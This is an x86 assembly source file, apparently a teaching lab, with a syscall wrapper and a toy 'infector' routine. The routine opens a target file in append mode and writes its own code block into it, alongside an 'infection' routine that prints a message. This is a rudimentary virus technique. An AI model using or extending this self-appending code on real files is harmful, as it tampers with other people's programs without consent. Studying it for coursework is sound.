section .text
global _start
global system_call
global infector
global infection
msg1  db "Hello, Infected File",0

extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:
    infection:
        ; push ebp
        ; mov ebp esp
        
        mov dword eax, 20 ; length of char*
        mov dword ebx, msg1 ; char*
        mov dword ecx, 1  ; stdout
        mov dword edx, 4  ; sys_write
       
        push eax
        push ebx
        push ecx
        push edx
        call system_call
        add esp, 16

        ret

infector:
    

    push ebp
    mov ebp, esp
    pushad

    mov eax, 0777
    mov ebx, 1025
    mov ecx, [ebp+8]
    mov edx, 5
    
    
    
    push eax
    push ebx
    push ecx
    push edx    
    call system_call  ; open
    add esp, 16



    


    mov edi,  eax
    mov esi, code_end - code_start   ; compilation time cal
    

    mov eax, esi
    mov ebx, code_start
    mov ecx, edi
    mov edx, 4

    push eax
    push ebx
    push ecx
    push edx
    call system_call  ; append
    add esp, 16

    mov eax, edi
    mov ebx, 6
   

    push eax
    push ebx
  
    call system_call  ; close
    add esp, 8
    popad
    mov esp, ebp
    pop ebp
    ret
    
    code_end:
